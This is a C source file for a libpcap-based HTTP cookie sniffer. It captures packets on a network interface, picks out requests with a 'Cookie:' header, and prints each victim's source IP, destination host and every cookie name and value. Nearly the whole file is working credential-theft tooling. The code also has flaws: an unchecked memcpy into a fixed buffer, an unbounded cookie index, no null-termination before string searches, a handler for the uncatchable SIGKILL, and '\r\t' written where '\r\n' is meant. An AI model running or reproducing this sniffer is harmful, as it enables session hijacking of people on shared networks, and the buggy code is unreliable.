#include <pcap/pcap.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <argp.h>

#include "libmypcap.h"
#include "libsniffcookies.h"

/* ---------- Global variables ---------- */

extern pcap_t *handle;

/* ---------- Functions ---------- */

error_t parse_opt(int key, char *arg, struct argp_state *state)
{
	Arguments *arguments = state->input;

	switch(key)
	{
		case 'i':
			arguments->interface = arg;
			break;
		case ARGP_KEY_ARG:
			return 0;
		default:
			return ARGP_ERR_UNKNOWN;
	}

	return 0;
}

void signal_handler(int signal)
{
	switch (signal)
	{
		case SIGINT :
		case SIGTERM :
		case SIGKILL :
			if (handle != NULL)
				pcap_close(handle);

			printf("\n[*] Good Bye\n");
			exit(EXIT_SUCCESS);
			break;
	}
}

/*
	Callback function used by pcap_loop().
*/
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	Ether_hdr *eptr;
	Ip_hdr *ip;
	Tcp_hdr *tcp;
	void *http_payload_addr;
	char *http_cookies_addr;
	char *tok_cookie, *saveptr, *saveptr2;

	u_char i = 0, j;
	u_short ether_type;
	u_int tcp_header_size;
	u_int http_payload_size;
	Host_cookies host_cookies;
	struct in_addr ip_src;
	static char http_payload[DEFAULT_TCP_PAYLOAD_SIZE];

	eptr = (Ether_hdr *) packet;
	ether_type = ntohs(eptr->ether_type);

	/* If the packet doesn't use IP, we stop the function */
	if (ether_type != ETHERTYPE_IP)
		return;

	ip = (Ip_hdr *)(packet + sizeof(Ether_hdr));

	/* If the packet doesn't use TCP, we stop the function */
	if (ip->ip_type != IPPROTO_TCP)
		return;

	tcp = (Tcp_hdr *)(packet + ETHER_HDR_LENGTH + IP_HDR_LENGTH);
	tcp_header_size = 4 * tcp->tcp_offset;

	http_payload_addr = (void *)(packet + ETHER_HDR_LENGTH + IP_HDR_LENGTH + tcp_header_size);
	http_payload_size = header->len - (ETHER_HDR_LENGTH + IP_HDR_LENGTH + tcp_header_size);

	memcpy(http_payload, http_payload_addr, http_payload_size);

	/* If the packet doesn't use HTTP, we stop the function */
	if ((strstr(http_payload, " HTTP/")) == NULL)
		return;

	/* If the packet doesn't use HTTP cookies, we stop the function */
	if ((http_cookies_addr = strstr(http_payload, "Cookie:")) == NULL)
		return;

	http_cookies_addr += 8;
	http_cookies_addr = strtok(http_cookies_addr, "\r\t\r\t");

	tok_cookie = strtok_r(http_cookies_addr, " ;", &saveptr);

	while (tok_cookie != NULL)
	{
		host_cookies.cookies[i].id = strtok_r(tok_cookie, "=", &saveptr2);
		host_cookies.cookies[i].val = strtok_r(NULL, "=", &saveptr2);

		tok_cookie = strtok_r(NULL, " ;", &saveptr);
		i++;
	}

	ip_src.s_addr = ip->ip_src_addr;
	host_cookies.ip_src = inet_ntoa(ip_src);

	host_cookies.host_dst = strstr(http_payload, "Host:");
	host_cookies.host_dst += 6;
	host_cookies.host_dst = strtok(host_cookies.host_dst, "\r\t\r\t");

	printf("Host : %s\n", host_cookies.host_dst);
	printf("IP sources : %s\n\n", host_cookies.ip_src);

	for (j=0; j<i; j++)
	{
		printf("%s =  %s\n", host_cookies.cookies[j].id, host_cookies.cookies[j].val);
	}

	printf("--------------------------------------\n");
}
